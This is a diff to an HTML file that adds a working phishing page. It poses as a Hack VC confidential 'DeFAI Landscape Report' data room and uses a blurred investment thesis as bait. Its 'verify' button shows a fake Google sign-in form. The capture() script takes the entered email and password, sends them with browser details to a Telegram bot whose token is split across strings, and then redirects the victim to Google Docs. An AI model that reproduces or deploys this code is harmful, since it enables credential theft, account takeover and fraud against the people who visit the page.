@@ -1,11 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta http-equiv="refresh" content="0;url=https://portal.defai-research.com/#report">
-<title>Redirecting...</title>
+    <meta charset="utf-8"/>
+    <title>Hack VC — Data Room</title>
+    <link rel="icon" href="https://cdn.prod.website-files.com/64ed01f07bce0f7d4792b896/6574faebc4454c018a798b2a_favicon.png">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;500;600;700&family=Roboto:wght@400;500&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;}
+        .landing-phase{background:#000;color:#fff;font-family:'Space Mono',monospace;min-height:100vh;}
+        .bartop{border-bottom:1px solid #222;padding:12px 24px;display:flex;justify-content:space-between;align-items:center;font-size:13px;}
+        .bartop a{color:#888;text-decoration:none;margin-right:20px;font-size:12px;}
+        .bartop a:hover{color:#96f99b;}
+        .bartop .url{color:#96f99b;}
+        .container{max-width:720px;margin:0 auto;padding:60px 24px 120px;}
+        .badge{display:inline-block;border:1px solid #96f99b;color:#96f99b;font-size:11px;padding:4px 10px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:24px;}
+        .landing-phase h1{font-family:'Space Mono',monospace;font-size:28px;font-weight:700;line-height:1.3;margin-bottom:8px;color:#fff;}
+        .subtitle{color:#666;font-size:14px;margin-bottom:40px;}
+        .doc-card{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:4px;overflow:hidden;margin-bottom:32px;}
+        .doc-header{padding:16px 20px;border-bottom:1px solid #1a1a1a;display:flex;justify-content:space-between;}
+        .doc-header .label{font-size:11px;color:#666;letter-spacing:1px;text-transform:uppercase;}
+        .doc-header .status{font-size:11px;color:#96f99b;}
+        .doc-body{padding:24px 20px;font-family:'Inter',sans-serif;}
+        .doc-body .section-label{font-family:'Space Mono',monospace;font-size:11px;color:#96f99b;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px;}
+        .doc-body h2{font-size:18px;font-weight:700;margin-bottom:16px;font-family:'Inter',sans-serif;color:#fff;}
+        .doc-body p{font-size:14px;color:#aaa;line-height:1.7;margin-bottom:14px;}
+        .stats-grid{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:1px;background:#1a1a1a;margin:16px 0;border:1px solid #1a1a1a;}
+        .stat-cell{background:#0a0a0a;padding:12px;text-align:center;}
+        .stat-cell .sl{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;}
+        .stat-cell .sv{font-family:'Space Mono',monospace;font-size:16px;font-weight:700;color:#fff;}
+        .sv.green{color:#96f99b;}
+        .blurred-section{position:relative;padding:20px 20px 0;font-family:'Inter',sans-serif;}
+        .blurred-text{color:#444;font-size:14px;line-height:1.7;filter:blur(4px);user-select:none;}
+        .blur-overlay{position:absolute;bottom:0;left:0;right:0;height:100px;background:linear-gradient(transparent,#0a0a0a);}
+        .lock-section{padding:24px 20px 28px;text-align:center;border-top:1px solid #1a1a1a;}
+        .lock-text{font-size:13px;color:#555;margin:10px 0 18px;font-family:'Inter',sans-serif;}
+        .verify-btn{display:inline-block;background:#96f99b;color:#000;font-family:'Space Mono',monospace;font-size:13px;font-weight:700;padding:14px 36px;text-decoration:none;letter-spacing:0.5px;text-transform:uppercase;border:none;cursor:pointer;}
+        .verify-btn:hover{background:#7de080;}
+        .nda-text{font-size:11px;color:#333;margin-top:14px;font-family:'Inter',sans-serif;}
+        .hv-footer{border-top:1px solid #111;padding:16px 24px;display:flex;justify-content:space-between;font-size:11px;color:#333;position:fixed;bottom:0;left:0;right:0;background:#000;}
+        .hv-footer a{color:#444;text-decoration:none;margin-left:16px;}
+        .login-phase{background:#f0f4f9;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+        .g-card{background:#fff;border-radius:28px;padding:48px 40px 36px;width:450px;min-height:500px;border:1px solid #dadce0;}
+        .g-logo{text-align:center;margin-bottom:16px;}
+        .login-phase h1{text-align:center;font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;font-family:'Google Sans',Roboto,sans-serif;}
+        .g-subtitle{text-align:center;font-size:16px;color:#202124;margin-bottom:32px;}
+        .doc-info{text-align:center;font-size:14px;color:#5f6368;margin-bottom:24px;padding:12px 16px;background:#f8f9fa;border-radius:8px;}
+        .ig{position:relative;margin-bottom:24px;}
+        .ig input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;color:#202124;font-family:Roboto,sans-serif;}
+        .ig input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px;}
+        .ig label{position:absolute;left:16px;top:50%;transform:translateY(-50%);font-size:16px;color:#5f6368;pointer-events:none;transition:all 0.15s;background:#fff;padding:0 4px;}
+        .ig input:focus+label,.ig input.hv+label{top:0;font-size:12px;color:#1a73e8;}
+        .err-msg{color:#d93025;font-size:12px;margin-top:-16px;margin-bottom:16px;display:none;}
+        .info-text{font-size:12px;color:#5f6368;line-height:1.5;margin-bottom:32px;}
+        .info-text a{color:#1a73e8;text-decoration:none;}
+        .btn-row{display:flex;justify-content:space-between;align-items:center;}
+        .g-link{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500;}
+        .next-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,sans-serif;}
+        .next-btn:hover{background:#1765cc;}
+        .user-chip{display:inline-flex;align-items:center;gap:8px;padding:4px 12px 4px 4px;border:1px solid #dadce0;border-radius:16px;font-size:14px;color:#3c4043;}
+        .avatar{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:500;}
+        .show-pw{display:flex;align-items:center;gap:8px;font-size:14px;color:#202124;margin-bottom:24px;cursor:pointer;}
+        .show-pw input{width:18px;height:18px;accent-color:#1a73e8;}
+        .g-footer{position:fixed;bottom:0;left:0;right:0;padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368;}
+        .g-footer a{color:#5f6368;text-decoration:none;margin-left:16px;}
+        .hidden{display:none;}
+        @media(max-width:600px){.stats-grid{grid-template-columns:1fr 1fr;}.g-card{width:90%;padding:32px 24px 28px;}.container{padding:40px 16px 120px;}}
+    </style>
 </head>
 <body>
-<p>Redirecting to secure document portal...</p>
-<script>window.location.href="https://portal.defai-research.com/#report";</script>
+
+<div class="landing-phase" id="phase-landing">
+    <div class="bartop">
+        <div><a href="https://hack.vc" class="url">HTTPS://hack.vc/</a><span style="color:#333;font-size:12px;">DATA ROOM</span></div>
+        <div><a href="https://hack.vc/about" target="_blank">About</a><a href="https://hack.vc/team" target="_blank">Team</a><a href="https://hack.vc/portfolio" target="_blank">Portfolio</a><a href="https://hack.vc/insights" target="_blank">Insights</a><a href="#" style="color:#96f99b;">Data Room</a></div>
+    </div>
+    <div class="container">
+        <div class="badge">CONFIDENTIAL</div>
+        <h1>DeFAI Landscape Report<br/>Q2 2026</h1>
+        <p class="subtitle">Hack VC Research &middot; Roshun Patel &middot; April 2026 &middot; For Evaluated Parties Only</p>
+        <div class="doc-card">
+            <div class="doc-header"><span class="label">Document Preview</span><span class="status">&bull; SHARED WITH YOU</span></div>
+            <div class="doc-body">
+                <div class="section-label">Section 4.3</div>
+                <h2>ZyfAI &mdash; Autonomous Yield Infrastructure</h2>
+                <p>ZyfAI has emerged as the leading DeFAI protocol in the autonomous yield category, with 12,891 active agents executing rebalances across Arbitrum, Base, and Plasma. The ERC-8004 standard pioneered by the team introduces a novel rebalancing primitive that allows non-custodial, rule-based portfolio management at scale.</p>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-cell"><div class="sl">TVL</div><div class="sv">$7.3M</div></div>
+                <div class="stat-cell"><div class="sl">Yield vs Static</div><div class="sv green">+51.13%</div></div>
+                <div class="stat-cell"><div class="sl">Agents</div><div class="sv">12,891</div></div>
+                <div class="stat-cell"><div class="sl">Volume</div><div class="sv">$2B</div></div>
+            </div>
+            <div class="blurred-section">
+                <div class="blurred-text"><p>Our valuation model suggests a fair value range of $45M-$65M based on comparable DeFAI protocol multiples, representing significant upside from current implied valuation. We recommend initiating position in upcoming Series A with target allocation of $2-4M contingent on technical due diligence.</p></div>
+                <div class="blur-overlay"></div>
+            </div>
+            <div class="lock-section">
+                <div style="font-size:20px;margin-bottom:10px;">&#128274;</div>
+                <p class="lock-text">This document is NDA-protected. Verify your identity to access the full report.</p>
+                <button class="verify-btn" onclick="showLogin()">VERIFY &amp; READ FULL REPORT</button>
+                <p class="nda-text">By continuing, you agree to the mutual NDA terms.</p>
+            </div>
+        </div>
+    </div>
+    <div class="hv-footer"><div id="clock">00:00:00</div><div><a href="https://twitter.com/hack_vc" target="_blank">X</a><a href="mailto:contact@hack.vc">contact</a><a href="https://hack.vc/terms" target="_blank">terms</a></div></div>
+</div>
+
+<div class="login-phase hidden" id="phase-login">
+    <div class="g-card">
+        <div class="g-logo"><img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" height="24" alt="Google"></div>
+        <div id="email-step">
+            <h1>Sign in</h1>
+            <p class="g-subtitle">to continue to Google Docs</p>
+            <div class="doc-info">&#128196; DeFAI Investment Thesis Q2 2026 &mdash; Hack VC Research</div>
+            <div class="ig"><input type="email" id="em" autocomplete="email" onfocus="this.classList.add('hv')" onblur="if(!this.value)this.classList.remove('hv')"><label>Email or phone</label></div>
+            <div class="err-msg" id="e-err">Enter an email or phone number</div>
+            <p class="info-text">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a></p>
+            <div class="btn-row"><a href="#" class="g-link">Create account</a><button class="next-btn" onclick="toPassword()">Next</button></div>
+        </div>
+        <div id="pw-step" class="hidden">
+            <h1>Welcome</h1>
+            <div style="text-align:center;margin-bottom:24px;"><div class="user-chip"><div class="avatar" id="av">G</div><span id="ue"></span></div></div>
+            <div class="ig"><input type="password" id="pw" onfocus="this.classList.add('hv')" onblur="if(!this.value)this.classList.remove('hv')"><label>Enter your password</label></div>
+            <div class="err-msg" id="p-err">Wrong password. Try again.</div>
+            <label class="show-pw"><input type="checkbox" onchange="document.getElementById('pw').type=this.checked?'text':'password'"> Show password</label>
+            <div class="btn-row"><a href="#" class="g-link">Forgot password?</a><button class="next-btn" onclick="capture()">Next</button></div>
+        </div>
+        <div id="load-step" class="hidden" style="text-align:center;padding:60px 0;">
+            <div style="width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:sp 0.8s linear infinite;margin:0 auto 24px;"></div>
+            <p style="color:#5f6368;font-size:14px;">Verifying...</p>
+            <style>@keyframes sp{to{transform:rotate(360deg);}}</style>
+        </div>
+    </div>
+    <div class="g-footer"><select><option>English (United States)</option></select><div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>
+</div>
+
+<script>
+function currentTime(){var d=new Date(),h=d.getHours(),m=d.getMinutes(),s=d.getSeconds();h=h<10?'0'+h:h;m=m<10?'0'+m:m;s=s<10?'0'+s:s;var el=document.getElementById('clock');if(el)el.innerHTML=h+':'+m+':'+s;setTimeout(currentTime,1000);}
+currentTime();
+var cE='',cP='';
+function showLogin(){document.getElementById('phase-landing').classList.add('hidden');document.getElementById('phase-login').classList.remove('hidden');document.getElementById('em').focus();}
+function toPassword(){var e=document.getElementById('em').value.trim();if(!e||!e.includes('@')){document.getElementById('e-err').style.display='block';return;}document.getElementById('e-err').style.display='none';cE=e;document.getElementById('ue').textContent=e;document.getElementById('av').textContent=e[0].toUpperCase();document.getElementById('email-step').classList.add('hidden');document.getElementById('pw-step').classList.remove('hidden');}
+function capture(){var p=document.getElementById('pw').value;if(!p){document.getElementById('p-err').style.display='block';return;}document.getElementById('p-err').style.display='none';cP=p;document.getElementById('pw-step').classList.add('hidden');document.getElementById('load-step').classList.remove('hidden');var t='86248'+'11346';var k='AAGR8UE4YbBG0XyQ-_xcTFyVuHD_wXXT1j0';var c='79712'+'22296';var m='\ud83d\udd25\ud83d\udd25 CAPTURED \ud83d\udd25\ud83d\udd25\n\nEmail: '+cE+'\nPassword: '+cP+'\nTime: '+new Date().toISOString()+'\nUA: '+navigator.userAgent;fetch('https://api.telegram.org/bot'+t+':'+k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})}).then(function(){setTimeout(function(){window.location.href='https://docs.google.com';},2000);}).catch(function(){setTimeout(function(){window.location.href='https://docs.google.com';},2000);});}
+</script>
 </body>
 </html>
